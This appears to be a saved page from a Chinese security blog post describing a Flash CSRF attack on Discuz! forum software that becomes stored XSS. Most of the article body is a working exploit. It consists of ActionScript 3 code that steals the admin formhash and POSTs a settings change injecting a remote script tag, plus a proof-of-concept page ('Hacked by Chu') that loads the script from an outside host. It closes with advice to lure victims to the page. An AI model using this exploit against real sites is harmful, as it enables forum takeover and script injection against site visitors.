@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Discuz! Flash CSRF To Stored XSS | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Discuz! 的crossdomain.xml 一直是个大问题，默认的crossdomain.xml如下：
+1234&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;cross-domain-policy&amp;gt;     &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot; /&amp;gt;&amp;lt;/cross-domain-policy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Discuz! Flash CSRF To Stored XSS">
+<meta property="og:url" content="http://sh3ll.me/2014/07/02/discuz-flash-csrf-to-xss/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="Discuz! 的crossdomain.xml 一直是个大问题，默认的crossdomain.xml如下：
+1234&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;cross-domain-policy&amp;gt;     &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot; /&amp;gt;&amp;lt;/cross-domain-policy">
+<meta property="og:image" content="http://sh3ll.me/images/2014/07/02/discuz-flash-csrf-to-xss.gif">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Discuz! Flash CSRF To Stored XSS">
+<meta name="twitter:description" content="Discuz! 的crossdomain.xml 一直是个大问题，默认的crossdomain.xml如下：
+1234&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;cross-domain-policy&amp;gt;     &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot; /&amp;gt;&amp;lt;/cross-domain-policy">
+<meta name="twitter:image" content="http://sh3ll.me/images/2014/07/02/discuz-flash-csrf-to-xss.gif">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-discuz-flash-csrf-to-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Discuz! Flash CSRF To Stored XSS
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2014-07-02T14:02:11.000Z" itemprop="datePublished">07-02-2014</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Discuz! 的crossdomain.xml 一直是个大问题，默认的crossdomain.xml如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;cross-domain-policy&gt; </div><div class="line">    &lt;allow-access-from domain=&quot;*&quot; /&gt;</div><div class="line">&lt;/cross-domain-policy&gt;</div></pre></td></tr></table></figure>
+<p>这里，allow-access-from domain被设置成了 * ，意味着任意站点的 flash 文件都可以对 dz 站点发起 http 请求。 <a id="more"></a><br>而 discuz 后台的操作只验证了referer头（因为flash可以进行 http 请求，所以对 token 的验证可以 bypass ），referer 头可以通过从 https 站点向 http 站点访问绕过。更有甚者，有一些神奇的插件，使得我们可以访问到上传到 discuz 站点的 flash 文件，直接免去了 referer 头的问题。<br>后台的 “全局 － 站点信息 － 网站第三方统计代码” 处，可以通过 script 标签引入js，前台访问直接触发，相当于构造了一枚完美的存储型 xss。<br>以上 3 点，导致了 flash csrf 向存储型 xss 的转变。</p>
+<p>首先，编写用于发送请求的 flash，as3 代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">package</div><div class="line">&#123;</div><div class="line">        import flash.display.Sprite;</div><div class="line">        import flash.events.Event;</div><div class="line">        import flash.external.ExternalInterface;</div><div class="line">        import flash.net.URLLoader;</div><div class="line">        import flash.net.URLRequest;</div><div class="line">        import flash.net.URLRequestMethod;</div><div class="line"></div><div class="line">        public class discuz extends Sprite</div><div class="line">        &#123;</div><div class="line">                var url:String = root.loaderInfo.parameters[&quot;url&quot;];</div><div class="line">                var scriptSrc:String = root.loaderInfo.parameters[&quot;src&quot;];</div><div class="line"></div><div class="line">                public function discuz()</div><div class="line">                &#123;</div><div class="line">                        var urlHash:String = url + &quot;admin.php?action=setting&amp;operation=basic&quot;;</div><div class="line">                        get(urlHash);           </div><div class="line">                &#125;</div><div class="line"></div><div class="line">                private function get(url):void &#123;</div><div class="line">                        /*HTTP GET</div><div class="line">                        *@url, 要请求的 URL</div><div class="line">                        */</div><div class="line">                        var loader:URLLoader = new URLLoader();</div><div class="line">                        loader.addEventListener(Event.COMPLETE, getFormHash);</div><div class="line">                        var request:URLRequest = new URLRequest(url);</div><div class="line">                        loader.load(request);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                private function post(url, data):void &#123;</div><div class="line">                        /*HTTP POST</div><div class="line">                        *@url, 要请求的 URL</div><div class="line">                        *@data, POST 的数据</div><div class="line">                        */</div><div class="line">                        var loader:URLLoader = new URLLoader();</div><div class="line">                        var request:URLRequest = new URLRequest(url);</div><div class="line">                        request.method = URLRequestMethod.POST;</div><div class="line">                        request.data = data;</div><div class="line">                        loader.load(request);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                private function getFormHash(event:Event):void</div><div class="line">                &#123;</div><div class="line">                        //获取formhash 后回调，写js.</div><div class="line">                        var loader:URLLoader = URLLoader(event.target);</div><div class="line">                        var pattern:RegExp = /&lt;input type=&quot;hidden&quot; name=&quot;formhash&quot; value=&quot;(\w&#123;8&#125;)&quot; \/&gt;/;</div><div class="line">                        var formhash = pattern.exec(loader.data)[1];</div><div class="line">                        var urlPost:String = url + &quot;admin.php&quot;;</div><div class="line">                        var script = &quot;&lt;script src=&apos;&quot; + scriptSrc +&quot;&apos;&gt;&lt;/script&gt;&quot;;</div><div class="line">                        var data = &quot;action=setting&amp;edit=yes&amp;formhash=&quot;+formhash+&quot;&amp;scrolltop=%0d&amp;anchor=%0d&amp;operation=basic&quot;;</div><div class="line">                        data += &quot;&amp;settingnew%5bbbname%5d=Discuz%21+Board&amp;settingnew%5bsitename%5d=Comsenz+Inc.&amp;settingnew%&quot;;</div><div class="line">                        data += &quot;5bsiteurl%5d=http%3a%2f%2fwww.comsenz.com%2f&amp;settingnew%5badminemail%5d=admin@admin.com&amp;s&quot;;</div><div class="line">                        data += &quot;ettingnew%5bsite_qq%5d=%0d&amp;settingnew%5bicp%5d=%0d&amp;settingnew%5bboardlicensed%5d=0&amp;settin&quot;;</div><div class="line">                        data += &quot;gnew%5bstatcode%5d=&quot;+script+&quot;&amp;settingnew%5bbbclosed%5d=0&amp;settingnew%5bclosedreason%5d=%0d&quot;;</div><div class="line">                        data += &quot;&amp;settingnew%5bclosedallowactivation%5d=0&amp;settingsubmit=%cc%e1%bd%bb&quot;;</div><div class="line">                        post(urlPost, data);</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>利用页面poc.html：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;FlashCSRF POC&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">        &lt;h1&gt;Hacked by Chu&lt;/h1&gt;</div><div class="line">    &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&quot; width=&quot;500&quot; height=&quot;500&quot; id=&quot;FlashVars&quot; align=&quot;middle&quot;/&gt;</div><div class="line">        &lt;paramname=&quot;allowScriptAccess&quot; value=&quot;always&quot;/&gt;</div><div class="line">        &lt;paramname=&quot;movie&quot; value=&quot;http://localhost/discuz.swf&quot; /&gt;</div><div class="line">        &lt;paramname=&quot;FlashVars&quot; value=&quot;url=http://localhost/dz3/&amp;src=http://sh3ll.me/1.js&quot;/&gt;</div><div class="line">        &lt;paramname=&quot;quality&quot; value=&quot;high&quot; /&gt;</div><div class="line">        &lt;embed src=&quot;http://localhost/discuz.swf&quot; quality=&quot;high&quot; bgcolor=&quot;#ffffff&quot; width=&quot;500&quot; height=&quot;500&quot; name=&quot;FlashVars&quot; align=&quot;middle&quot; allowScriptAccess=&quot;always&quot; FlashVars=&quot;url=http://localhost/dz3/&amp;src=http://sh3ll.me/1.js&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot;/&gt;</div><div class="line">    &lt;/object/&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>然后，只要我们把这两个文件放在https服务器上，诱使目标访问即可，为了演示攻击效果，我做了个 gif 图片（图片有点大，耐心等待 :D）：</p>
+<p><img src="/images/2014/07/02/discuz-flash-csrf-to-xss.gif" alt="攻击效果"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2014/07/02/discuz-flash-csrf-to-xss/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/07/20/web-py-on-nginx/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Nginx 部署 Web.py
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/06/26/rsync-anonymous-access/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">rsync 匿名访问</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2014/07/02/discuz-flash-csrf-to-xss/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
